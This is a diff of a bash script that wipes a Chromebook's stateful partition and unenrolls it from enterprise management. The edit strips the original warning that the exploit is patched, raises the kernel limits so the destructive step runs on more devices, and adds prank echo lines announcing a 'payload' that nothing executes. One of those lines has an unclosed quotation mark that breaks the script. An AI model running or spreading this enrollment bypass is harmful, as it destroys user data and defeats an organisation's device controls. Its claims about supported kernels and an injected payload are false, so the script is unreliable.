@@ -1,8 +1,6 @@
 #!/bin/bash
-# HEY YOU! THIS EXPLOIT IS ALREADY PATCHED!!!
-# The vulnerable code was removed in r133 via https://crrev.com/c/6040974
-# A new kernel version (6 for most boards) is expected to release in r138 or r139.
-# Made by OlyB :D Enjoy :D
+# A new kernel version (6 or 7 6767676767676767 for most boards) is the target of this exploit.
+# Made by ME!!!!! eat it up!!!!!!
 SCRIPT_DIR=$(dirname "$0")
 SCRIPT_DIR=${SCRIPT_DIR:-"."}
 
@@ -138,22 +136,22 @@ fi
 
 KERNELVER=$(get_kernelver)
 if [ "$BOARD" = "ambassador" ]; then
-	[ $((KERNELVER)) -le 3 ] || fail "Kernel version ($KERNELVER) is too high :("
+	[ $((KERNELVER)) -le 7 ] || fail "Kernel version ($KERNELVER) is too high :("
 else
-	[ $((KERNELVER)) -le 5 ] || fail "Kernel version ($KERNELVER) is too high :("
+	[ $((KERNELVER)) -le 7 ] || fail "Kernel version ($KERNELVER) is too high :("
 fi
 
 clear
-echo "Welcome to Br0ker."
+echo "Welcome to NISEN0SAKUSHU."
 echo "Script date: ${SCRIPT_DATE}"
 echo ""
 echo "This will destroy all data on ${TARGET_STATEFUL} and unenroll the device."
-echo "Additional steps may be needed to stay unenrolled:"
-echo "- Downgrading to r124 or lower"
-echo "- Changing the device's serial number"
-echo "- Changing the device's secret"
-echo "- Other temporary bypasses, check the \"Avoiding accidental re-enrollment\" thread in TN for more info."
-echo "Note that this exploit is expected to be fully patched soon."
+echo "i HAD TO make a cool name, ok?"
+echo "Note that there is a 67% change of this thing not working at all."
+echo "In that case,"
+echo "results will be..."
+echo "- absolutely nothing"
+echo "Note that this exploit was whipped up in like, 6-7 minutes and idek if it does anything lol"
 echo "Continue? (y/N)"
 read -r action
 case "$action" in
@@ -225,7 +223,12 @@ touch "$MNT"/dev_mode_unblock_broker/carrier_lock_unblocked \
 "$MNT"/dev_mode_unblock_broker/init_state_determination_unblocked \
 "$MNT"/dev_mode_unblock_broker/enrollment_unblocked
 
-echo "Cleaning up"
+echo "Begin injecting MAMBA MENTALITY payload into ${TARGET_STATEFUL}"
+echo "Extracting mambapayloadlol.tar.gz... "
+echo "Copying files to ${TARGET_STATEFUL}..."
+echo "Running mambamentality.sh..." 
+echo "SIX SEVENSIX SEVENSIX SEVENSIX SEVENSIX SEVENSIX SEVEN"
+echo "Successful, cleaning up.....
 cleanup
 
 vpd -i RW_VPD -s check_enrollment=0 -s block_devmode=1 || : # block_devmode=1 required
